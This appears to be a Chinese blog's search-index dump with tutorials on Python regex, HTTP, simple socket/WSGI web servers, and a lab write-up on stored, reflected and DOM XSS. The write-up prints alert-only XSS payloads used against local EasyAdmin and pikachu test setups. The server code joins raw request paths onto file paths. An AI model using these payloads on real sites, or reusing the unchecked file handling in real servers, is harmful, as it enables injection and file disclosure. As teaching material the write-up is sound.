掌握NoSQL、 MQ， 熟练使⽤对应技术解决⽅案&lt;&#x2F;p&gt; 123456789101112s=\"\"\"&lt;div&gt;&lt;p&gt;岗位职责：&lt;/p&gt;&lt;p&gt;完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;必备要求： &lt;/p&gt;&lt;p&gt;良好的自我驱动力和职业素养， 工作积极主动、 结果导向&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;/p&gt;&lt;p&gt;技术要求： &lt;/p&gt;&lt;p&gt;1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式&lt;/p&gt; \"\"\"ret =re.sub(r\"&lt;/?\\w*&gt;\",\"\",s)ret Out: &apos;\\n岗位职责：\\n完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作\\n\\n必备要求： \\n良好的自我驱动力和职业素养， 工作积极主动、 结果导向\\n&amp;nbsp;\\n技术要求： \\n1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式 \\n&apos;split 根据匹配进行切割字符串，并返回一个列表 需求：切割字符串“info:dddd 33 shandong” 12ret =re.split(r\":| \",\"info:dddd 33 shandong\")ret Out:[&apos;info&apos;, &apos;dddd&apos;, &apos;33&apos;, &apos;shandong&apos;]0x09 Python贪婪和非贪婪Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符； 非贪婪相反，总是尝试匹配尽可能少的字符。 在*、?、+、{m,n}后面加上？，使贪婪变成非贪婪 123s = \"this is a number 234-235-22-423\"r = re.match(\".+(\\d+-\\d+-\\d+-\\d+)\",s)r.group(1) Out:&apos;4-235-22-423&apos;123# 变为非贪婪r = re.match(\".+?(\\d+-\\d+-\\d+-\\d+)\",s)r.group(1) Out:&apos;234-235-22-423&apos; 说明：正则表达式模式中使用到通配字， 那它在从左到右的顺序求值时， 会尽量“抓取”满足匹配最长字符串， 在我们上面的例子里面， “.+”会从字符串的起始处抓取满足模式的最长字符， 其中包括我们想得到的第一个整型字段的中的大部分，“\\d+”只需一位字符就可以匹配， 所以它匹配了数字“4”， 而“.+”则匹配了从字符串起始到这个第一位数字4之前的所有字符。 解决方式：非贪婪操作符“？”,这个操作符可以用在*、?、+、{m,n}后面，要求正则匹配的越少越好。 1re.match(r\"aa(\\d+)\",\"aa2343ddd\").group(1) Out:&apos;2343&apos;1re.match(r\"aa(\\d+?)\",\"aa2343ddd\").group(1) Out:&apos;2&apos;练习1提取下面文本中图片链接 1&lt;link rel&#x3D;&quot;apple-touch-icon-precomposed&quot; href&#x3D;&quot;https:&#x2F;&#x2F;s.mozhe.cn&#x2F;static&#x2F;ico&#x2F;apple-touch-icon.png&quot;&gt; 123s= \"\"\"&lt;link rel=\"apple-touch-icon-precomposed\" href=\"https://s.mozhe.cn/static/ico/apple-touch-icon.png\"&gt; &lt;link rel=\"apple-touch-icon-precomposed\" href=\"https://s.mozhe.cn/static/ico/apple-touch-icon.png\"&gt;\"\"\"ret =re.search(r\"https:.+?\\.png\",s)ret.group() Out:&apos;https://s.mozhe.cn/static/ico/apple-touch-icon.png&apos;练习2123https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;dd&amp;rsv_spt&#x3D;1正则后变为：https:&#x2F;&#x2F;www.baidu.com&#x2F; 12s= \"\"\"https://www.baidu.com/s?wd=dd&amp;rsv_spt=1\"\"\"re.sub(r\"https://.+?/\", \"\", s) Out:&apos;s?wd=dd&amp;rsv_spt=1&apos;12# 使用匿名函数lambda作为处理函数re.sub(r\"(https://.+?/).*\",lambda x: x.group(1),s) Out:&apos;https://www.baidu.com/&apos;","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Python基础","slug":"python/Python基础","permalink":"https://fishni.github.io/categories/python/Python%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://fishni.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"【XSS（一）】1.2 XSS（存储型-反射型-DOM型）实战","slug":"1.2 XSS（存储型-反射型-DOM型）实战","date":"2020-04-10T16:00:00.000Z","updated":"2020-04-14T08:52:50.431Z","comments":true,"path":"2020/04/11/1.2 XSS（存储型-反射型-DOM型）实战/","link":"","permalink":"https://fishni.github.io/2020/04/11/1.2%20XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B-%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM%E5%9E%8B%EF%BC%89%E5%AE%9E%E6%88%98/","excerpt":"本文主要内容 存储型、反射型、DOM型造成XSS漏洞的简单原理、危害、攻击流程 利用EasyAdmin极简版的实战测试案例 几种XSS辅助测试工具","text":"本文主要内容 存储型、反射型、DOM型造成XSS漏洞的简单原理、危害、攻击流程 利用EasyAdmin极简版的实战测试案例 几种XSS辅助测试工具 认识危害 0x01 发现XSS1.1 XSS位置 直接插入到SCRIPT标签里 插入到HTML注释里 插入到HTML标签的属性里 插入到HTML标签的名字 作为HTML标签的名字 直接插入到CSS里 …… 1.2 手工发现 参数中提交XSS payload代码 在所有可以提交参数并能在页面返回的位置上 URL的每一个参数 URL本身 表单 搜索框 …… 1.3 常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈等 存在风险：搜索框、当前目录、图片属性等 实战环境配置 EasyAdmin极简版安装：[下载链接](链接：https://pan.baidu.com/s/1mEIcBSoFBBjN9DgIDzyxcg提取码：qpzn) 下载后，本地windows+phpstudy，放置在WWW目录下 访问，之后创建数据库，即可完成配置 0x01 存储型XSS实战1.1 存储型XSS攻击流程 1.2 利用easyadmin进行测试 利用img标签，&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;进行测试存在漏洞的地方 经测试，发现在添加标签时，出现弹窗 发布后，当点击该帖子，即可弹窗 点击开发者工具，可发现对添加的图片标签进行解析了，但并未解析出来，故执行了onerror事件，弹窗 0x02 反射型XSS实战2.1 反射型XSS攻击流程 2.2 利用easyadmin测试 攻击者在URL中插入XSS代码，服务端将URL中的XSS代码输出到页面上，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击 寻址存在URL的输入点，测试搜索栏 闭合title，并测试弹窗 寻找其他输入点 尖括号闭合，测试&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 0x03DOM型XSS实战3.1 测试环境 ubuntu+docker+pikachu之xss平台 3.2 DOM型xss测试 DOM型xss-x初始化界面： 步骤一：输入111，URL发生变化 再点击新出现的，URL又发生变化 步骤二：F12审查源码 步骤三：审查domxss()函数 分析：JS代码，定义了一个domxss函数，利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str，然后经过URL解码和字符串分隔，取出URL中的参数内容，再把 “+” 替换为 “ ”（空格），赋值给 xss最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中；跟前面的DOM型xss不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get) 步骤四：构造payload：#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt; 尝试payload：#&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt; 0x04 XSS辅助测试工具4.1 BeEFhttp://beefproject.com 4.2 XSS’ORhttp://xssor.io 4.3 IE Testerhttps://www.my-debugbar.com/wiki/IETester/HomePage 等等……..参考链接 http://blog.nsfocus.net/xss-start-finish/#34","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"}]},{"title":"【python-Web服务器】1.6 python-Web服务器框架-实现","slug":"1.6 python-Web服务器框架-实现","date":"2020-04-09T16:00:00.000Z","updated":"2020-04-10T01:54:29.234Z","comments":true,"path":"2020/04/10/1.6 python-Web服务器框架-实现/","link":"","permalink":"https://fishni.github.io/2020/04/10/1.6%20python-Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A1%86%E6%9E%B6-%E5%AE%9E%E7%8E%B0/","excerpt":"本文主要内容：将Web框架和Web服务器结合实现简单的服务器，及相关python知识的了解","text":"本文主要内容：将Web框架和Web服务器结合实现简单的服务器，及相关python知识的了解 0x01 服务器代码（MyWebServer.py）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# coding:utf-8import socketimport reimport sysfrom multiprocessing import Processfrom MyWebFramework import Application# 设置静态文件根目录HTML_ROOT_DIR = \"./html\"WSGI_PYTHON_DIR = \"./wsgipython\"class HTTPServer(object): \"\"\"\"\"\" def __init__(self, application): \"\"\"构造函数， application指的是框架的app\"\"\" self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.app = application def start(self): self.server_socket.listen(128) while True: client_socket, client_address = self.server_socket.accept() # print(\"[%s, %s]用户连接上了\" % (client_address[0],client_address[1])) print(\"[%s, %s]用户连接上了\" % client_address) handle_client_process = Process(target=self.handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() def start_response(self, status, headers): \"\"\" status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] star \"\"\" response_headers = \"HTTP/1.1 \" + status + \"\\r\\n\" for header in headers: response_headers += \"%s: %s\\r\\n\" % header self.response_headers = response_headers def handle_client(self, client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端请求数据 request_data = client_socket.recv(1024) print(\"request data:\", request_data) request_lines = request_data.splitlines() for line in request_lines: print(line) # 解析请求报文 # 'GET / HTTP/1.1' request_start_line = request_lines[0] # 提取用户请求的文件名 print(\"*\" * 10) print(request_start_line.decode(\"utf-8\")) file_name = re.match(r\"\\w+ +(/[^ ]*) \", request_start_line.decode(\"utf-8\")).group(1) method = re.match(r\"(\\w+) +/[^ ]* \", request_start_line.decode(\"utf-8\")).group(1) env = &#123; \"PATH_INFO\": file_name, \"METHOD\": method &#125; response_body = self.app(env, self.start_response) response = self.response_headers + \"\\r\\n\" + response_body # 向客户端返回响应数据 client_socket.send(bytes(response, \"utf-8\")) # 关闭客户端连接 client_socket.close() def bind(self, port): self.server_socket.bind((\"\", port))def main(): sys.path.insert(1, WSGI_PYTHON_DIR) if len(sys.argv) &lt; 2: sys.exit(\"python MyWebServer.py Module:app\") # python MyWebServer.py MyWebFrameWork:app module_name, app_name = sys.argv[1].split(\":\") # module_name = \"MyWebFrameWork\" # app_name = \"app\" m = __import__(module_name) app = getattr(m, app_name) http_server = HTTPServer(app) # http_server.set_port http_server.bind(8000) http_server.start()if __name__ == \"__main__\": main() 1.1 sys.argv sys.argv[] 一个从程序外部获取参数的桥梁,外部参数不唯一，所以sys.argv以列表形式存储参数；其第一个元素是程序本身，随后才依次是外部给予的参数 简单测试 123#本测试是在jupyter notebook中测试import syssys.argv [&apos;c:\\\\users\\\\fishmouse\\\\appdata\\\\local\\\\programs\\\\python\\\\python37\\\\lib\\\\site-packages\\\\ipykernel_launcher.py&apos;, &apos;-f&apos;, &apos;C:\\\\Users\\\\fishmouse\\\\AppData\\\\Roaming\\\\jupyter\\\\runtime\\\\kernel-049997d2-f810-4826-9743-6db3b4d2e9ea.json&apos;] 本地测试 测试代码 123import sysb=sys.argvprint(b) 测试结果(第三个输出原因是在测试代码中打印了b[0]) Pycharm为当前程序添加（python MyWebServer.py）的参数 0x02 Web框架代码（MyWebFramework.py）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# coding:utf-8import time# from MyWebServer import HTTPServer# 设置静态文件根目录HTML_ROOT_DIR = \"./html\"class Application(object): \"\"\"框架的核心部分，也就是框架的主题程序，框架是通用的\"\"\" def __init__(self, urls): # 设置路由信息 self.urls = urls def __call__(self, env, start_response): path = env.get(\"PATH_INFO\", \"/\") # /static/index.html if path.startswith(\"/static\"): # 要访问静态文件 file_name = path[7:] # 打开文件，读取内容 try: file = open(HTML_ROOT_DIR + file_name, \"rb\") except IOError: # 代表未找到路由信息，404错误 status = \"404 Not Found\" headers = [] start_response(status, headers) return \"not found\" else: file_data = file.read() file.close() status = \"200 OK\" headers = [] start_response(status, headers) return file_data.decode(\"utf-8\") for url, handler in self.urls: #(\"/ctime\", show_ctime) if path == url: return handler(env, start_response) # 代表未找到路由信息，404错误 status = \"404 Not Found\" headers = [] start_response(status, headers) return \"not found\"def show_ctime(env, start_response): status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return time.ctime()def say_hello(env, start_response): status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return \"hello world\"def say_haha(env, start_response): status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return \"hello big world\"urls = [ (\"/\", show_ctime), (\"/ctime\", show_ctime), (\"/sayhello\", say_hello), (\"/sayhaha\", say_haha), ]app = Application(urls)# if __name__ == \"__main__\":# urls = [# (\"/\", show_ctime),# (\"/ctime\", show_ctime),# (\"/sayhello\", say_hello),# (\"/sayhaha\", say_haha),# ]# app = Application(urls)# http_server = HTTPServer(app)# http_server.bind(8000)# http_server.start() 2.1 __call__ 在Python中，函数其实是一个对象： 12f=absf.__name__ &apos;abs&apos;1f(-123) 123 由于 f 可以被调用，所以，f 被称为可调用对象。 所有的函数都是可调用对象。 一个类实例也可以变成一个可调用对象，只需要实现一个特殊方法__call__()。 我们把 Person 类变成一个可调用对象： 1234567class Person(object): def __init__(self, name, gender): self.name = name self.gender = gender def __call__(self, friend): print('My name is %s...' % self.name) print ('My friend is %s...' % friend) 可以对 Person 实例直接调用： 12p = Person('Bob', 'male')p(\"Tim\") My name is Bob... My friend is Tim... 单看 p(&apos;Tim&apos;) 你无法确定 p 是一个函数还是一个类实例，所以，在Python中，函数也是对象，对象和函数的区别并不显著。测试结果","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【python-Web服务器】1.5 python-Web动态服务器-1","slug":"1.5 python-Web动态服务器-1","date":"2020-04-07T16:00:00.000Z","updated":"2020-04-08T13:09:45.026Z","comments":true,"path":"2020/04/08/1.5 python-Web动态服务器-1/","link":"","permalink":"https://fishni.github.io/2020/04/08/1.5%20python-Web%E5%8A%A8%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1/","excerpt":"本文主要内容 服务器动态资源请求相关知识（WSGI） python实现Web动态服务器示例","text":"本文主要内容 服务器动态资源请求相关知识（WSGI） python实现Web动态服务器示例 0x01 服务器动态资源请求1.1 浏览器请求动态页面过程 1.2 WSGI Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口 怎么在你刚建立的Web服务器上运⾏⼀个Django应用和Flask应用，如何不做任何改变而适应不同的web架构呢？ 在以前，选择Python web架构会受制于可用的web服务器 ，反之亦然。 如果架构和服务器可以协同⼯作，那就好了： 但有可能面对（或者曾有过）下⾯的问题，当要把⼀个服务器和⼀个架构结合起来时，却发现他们不是被设计成协同⼯作的： 那么，怎么可以不修改服务器和架构代码⽽确保可以在多个架构下运⾏web 服务器呢？答案就是Python Web Server Gateway Interface (或简称 WSGI，读作“wizgy”)。 WSGI允许开发者将选择web框架和web服务器分开。可以混合匹配web服务 器和web框架，选择⼀个适合的配对。⽐如,可以在Gunicorn或者 Nginx/uWSGI 或者Waitress上运⾏Django,Flask,或 Pyramid。真正的混合 匹配，得益于WSGI同时⽀持服务器和架构： web服务器必须具备WSGI接⼝，所有的现代Python Web框架都已具备WSGI接口，它让你不对代码作修改就能使服务器和特点的web框架协同⼯作。WSGI由web服务器支持，⽽web框架允许你选择适合自己的配对，但它同样对于服务器和框架开发者提供便利使他们可以专注于自己偏爱的领域和专长 而不至于相互牵制。其他语言也有类似接⼝：java有Servlet API，Ruby有 Rack。 1.3 定义WSGI接口WSGI接⼝定义⾮常简单，它只要求Web开发者实现⼀个函数，就可以响应 HTTP请求。我们来看⼀个最简单的Web版本的“Hello World!”： 123def apllication(environ, start_response): start_reponse('200 ok',[('Content-Type','text/html')]) return 'Hello World!' 上⾯的pplication()函数就是符合WSGI标准的⼀个HTTP处理函数，它接收两个参数： environ：一个包含所有HTTP请求信息的dict对象 start_response：一个发送HTTP响应的函数 整个application()函数本身没有涉及到任何解析HTTP的部分，也就是说，把底层web服务器解析部分和应用程序逻辑部分进行了分离，这样开发者就可以专⼼做⼀个领域了 不过，这个application()函数怎么调用？如果我们自己调用，两个参数environ和start_response我们没法提供，返回的str也没法发给浏览器。 所以application()函数必须由WSGI服务器来调用。有很多符合WSGI规范的服务器。而我们此时的web服务器项目的目的就是做一个可以解析静态网页还可以解析动态网页的服务器 0x02 python-Web动态服务器示例2.1 本地Pycharm布置目录 2.2 web服务器代码（04_dynamic_web_server.py）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128# coding: utf-8import socketfrom multiprocessing import Processimport reimport sys# 设置静态文件根目录HTML_ROOT_DIR = \"./html\"# 设置动态执行文件目录WSGI_PYTHON_DIR = \"./wsgipython\"class HTTPserver(object): \"\"\"init\"\"\" def __init__(self): self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) def start(self): self.server_socket.listen(128) \"\"\"多进程处理请求\"\"\" while True: client_socket, client_address = self.server_socket.accept() print(\"[%s,%s]用户连接上了\" % client_address) handle_client_process = Process(target=self.handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() def start_response(self,status,headers): # 分析： start_response 处理响应的状态码和头部信息 \"\"\" status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] star \"\"\" response_headers = \"HTTP/1.1 \"+ status + \"\\r\\n\" for header in headers: response_headers += \"%s: %s\\r\\n\" % header self.response_headers = response_headers def handle_client(self, client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(2048) print(\"request data:\",request_data) # 处理请求数据 request_lines = request_data.splitlines() for line in request_lines: print(line) # 解析请求报文 # \"GET / HTTP/1.1\" request_start_line = request_lines[0] # 提取用户请求的文件名 file_name = re.match(r\"\\w+ +(/[^ ]*)\",request_start_line.decode(\"utf-8\")).group(1) # 提取用户请求的方法 method = re.match(r\"(\\w+) +/[^ ]* \", request_start_line.decode(\"utf-8\")).group(1) # \"/ctime.py\" # \"/sayhello.py\" # 判断是否为动态资源请求 if file_name.endswith(\".py\"): # try使用提升容错率：也即访问的资源不存在时给出提示 try: # __import__魔术方法，导入已经创建的py模块，类似import # m这里以模块使用 m = __import__(file_name[1:-3]) except Exception: # 使用self.response_headers为服务器添加属性 self.response_headers = \"HTTP/1.1 404 Not Found\\r\\n\" response_body= \"not found\" else: # 字典表示请求的相关信息 env = &#123; \"PATH_INFO\":file_name, \"METHOD\":method &#125; response_body = m.application(env,self.start_response) # response 服务器响应浏览器请求的数据 response = self.response_headers+ \"\\r\\n\" + response_body else: if \"/\" == file_name: file_name= \"/index.html\" # 打开文件 try: file = open(HTML_ROOT_DIR+file_name,\"rb\") except IOError: # 构造响应数据 response_start_line = \"HTTP/1.1 404 Not Found\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"file is not found!\" else: file_data = file.read() file.close() # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = file_data.decode(\"utf-8\") response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close() def bind(self,port): self.server_socket.bind((\"\", port))def main(): # 利用sys模块导入路径 sys.path.insert(1, WSGI_PYTHON_DIR) http_server = HTTPserver() http_server.bind(8000) http_server.start()if __name__ == \"__main__\": main() 2.3 动态执行脚本（ctime.py）代码：12345678910111213141516171819202122232425# coding: utf-8import time# \"/ctime.py?timezone=e8\"# \"/ctime.py?timezone=e1\"def application(env, start_response): # env.get(\"Method\") # env.get(\"PATH_INFO\") # env.get(\"QUERY_STRING\") \"\"\" 分析1：env保存的是http的请求，apllication 函数利用env相关信息进行处理 分析2： 浏览器动态请求的页面，再次通过服务器响应至浏览器端，状态码，和头部信息需在apllication中处理 分析3：start_response函数用来处理响应的状态status和响应头headers返回至dynamic_web_server服务器 分析4：return 返回内容，也即是响应体response_body内容 \"\"\" status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return time.ctime() 2.4 执行流程图 大概画了一下 2.5 测试","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【python-Web服务器】1.4 python-Web静态服务器-3-使用类","slug":"1.4 python-Web静态服务器-3-使⽤类","date":"2020-04-07T16:00:00.000Z","updated":"2020-04-08T06:28:47.866Z","comments":true,"path":"2020/04/08/1.4 python-Web静态服务器-3-使⽤类/","link":"","permalink":"https://fishni.github.io/2020/04/08/1.4%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-3-%E4%BD%BF%E2%BD%A4%E7%B1%BB/","excerpt":"本文主要内容 文件打开方式，文本与二进制区别 用类封装简单的Web静态服务器","text":"本文主要内容 文件打开方式，文本与二进制区别 用类封装简单的Web静态服务器 0x01 文件打开方式，文本与二进制区别 文本文件，操作系统会对\\n进行一些隐式变换，因此文本文件直接跨平台使用会出问题。在Windows下，写入\\n时，操作系统会隐式的将\\n转换为\\r\\n，再写入到文件中；读的时候，会把\\r\\n隐式转化为\\n，再读到变量中。在Linux下，写入’\\n’时，操作系统不做隐式变换。二进制文件，操作系统不会对\\n进行隐式变换，很多二进制文件（如电影、图片等）可以跨平台使用。 以二进制形式写入wb文件 123f= open(\"wb\",\"wb\")f.write(b\"hello\\nhello\")f.close() 以文本方式写入w文件 123f= open(\"w\",\"w\")f.write(\"hello\\nhello\")f.close() 使用Notepad++打开wb和w文件显示并无任何区别 分别读取观察,发现windows中文本读取将\\n变为\\r\\n 12with open(\"wb\",\"rb\") as f: print(f.read()) b&apos;hello\\nhello&apos;12with open(\"w\",\"rb\") as f: print(f.read()) b&apos;hello\\r\\nhello&apos;0x02 python使用类封装Web静态服务器 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# coding: utf-8import socketfrom multiprocessing import Processimport reHTML_ROOT_DIR = \"./html\"class HTTPserver(object): \"\"\"init\"\"\" def __init__(self): self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) def start(self): self.server_socket.listen(128) \"\"\"多进程处理请求\"\"\" while True: client_socket, client_address = self.server_socket.accept() print(\"[%s,%s]用户连接上了\" % client_address) handle_client_process = Process(target=self.handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() def handle_client(self,client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(2048) print(\"request data:\",request_data) # 处理请求数据 request_lines = request_data.splitlines() for line in request_lines: print(line) # \"GET / HTTP/1.1\" request_start_line = request_lines[0] file_name = re.match(r\"\\w+ +(/[^ ]*)\",request_start_line.decode(\"utf-8\")).group(1) if \"/\" == file_name: file_name= \"/index.html\" # 打开文件 try: file = open(HTML_ROOT_DIR+file_name,\"rb\") except IOError: # 构造响应数据 response_start_line = \"HTTP/1.1 404 Not Found\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"file is not found!\" else: file_data = file.read() file.close() # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = file_data.decode(\"utf-8\") response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close() def bind(self,port): self.server_socket.bind((\"\", port))def main(): http_server = HTTPserver() http_server.bind(8000) http_server.start()if __name__ == \"__main__\": main()","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【python-Web服务器】1.1 HTTP协议简介","slug":"1.1 HTTP协议简介","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-06T09:10:19.915Z","comments":true,"path":"2020/04/06/1.1 HTTP协议简介/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.1%20HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/","excerpt":"本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。","text":"本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。 0x01 使用谷歌/火狐浏览器分析 在Web应用中，服务器把网页传给浏览器，实际上就是把网页的HTML代码发送给浏览器，让浏览器显示出来。而浏览器和服务器之间的传输协议是HTTP,所以： HTML是一种用来定义网页的文本 HTTP是在网络上传输HTML的协议，用于浏览器和服务器的通信 Chrome浏览器提供了完整的调试工具，非常适合Web开发。在Chrome浏览器（更多工具–&gt;开发者工具）或者Windows下F12说明 Elements显示网页的结构 Network显示浏览器和服务器的通信 点击Network，确保第一个小红灯亮着，Chrome就会记录所有浏览器和服务器之间的通信： 0x02 HTTP协议分析当在地址栏输入www.baidu.com时,浏览器显示百度首页。在这个过 程中，浏览器都干了哪些事情呢？通过Network的记录，我们就可以知道。 在Network中，找到www.baidu.com那条记录，点击，右侧将显示Request Headers，点击右侧的view-source，我们就可以看到浏览器发给百度服务器的请求： 2.1 浏览器请求 说明：（最主要的头两⾏分析如下） 第⼀⾏GET / HTTP/1.1：GET表示⼀个读取请求，将从服务器获得⽹⻚数据，/表示URL的路径，URL 总是以/开头，/就表示⾸⻚，最后的HTTP/1.1指示采⽤的HTTP协议版本是 1.1。⽬前HTTP协议的版本就是1.1，但是⼤部分服务器也⽀持1.0版本，主 要区别在于1.1版本允许多个HTTP请求复⽤⼀个TCP连接，以加快传输速 度。 从第⼆⾏开始，每⼀⾏都类似于Xxx: abcdefg：Host: www.baidu.com，表示请求的域名是www.baidu.com。如果⼀台服务器有多个⽹站，服务器就需 要通过Host来区分浏览器请求的是哪个⽹站。 2.2 服务器响应继续找到Response Headers，点击view-source，显示服务器返回的原始响应数据： HTTP响应分为Header和Body两部分（Body是可选项），我们在Network中 看到的Header最重要的⼏⾏如下： HTTP/1.1 200 OK：200表示⼀个成功的响应，后⾯的OK是说明。 如果返回的不是200，那么往往有其他的功能，例如 失败的响应有404 Not Found：网⻚不存在 500 Internal Server Error：服务器内部出错 等等… Content-Type:text/html：Content-Type指示响应的内容，这⾥是text/html表示HTML⽹⻚。 请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图⽚，是视频还是⾳乐。浏览器并不靠URL来判断响应的内容，所以，即使URL是 http://www.baidu.com/meimei.jpg，它也不⼀定就是图⽚。 HTTP响应的Body就是HTML源码，右键查看网页源码，就是查看响应的body 浏览器解析过程 当浏览器读取到百度⾸⻚的HTML源码后，它会解析HTML，显示⻚⾯，然后，根据HTML⾥⾯的各种链接，再发送HTTP请求给百度服务器，拿到相应的图⽚、视频、Flash、JavaScript脚本、CSS等各种资源，最终显示出⼀个完整的⻚⾯。所以我们在Network下⾯能看到很多额外的HTTP请求 0x03 总结3.1 HTTP请求步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括： ⽅法：GET还是POST，GET仅请求资源，POST会附带⽤户数据； 路径：/full/url/path； 域名：由Host头指定； 以及其他相关的Header； 如果是POST，那么请求还包括⼀个Body，包含⽤户数据 步骤2：服务器向浏览器返回HTTP响应，响应包括： 响应代码：200表示成功，3xx表示重定向，4xx表示客户端发送的请求 有错误，5xx表示服务器端处理时发⽣了错误； 响应类型：由Content-Type指定； 以及其他相关的Header； 通常服务器的HTTP响应会携带内容，也就是有⼀个Body，包含响应的 内容，⽹⻚的HTML源码就在Body中。 步骤3：如果浏览器还需要继续向服务器请求其他资源， ⽐如图⽚，就再次发出HTTP请求，重复步骤1、2 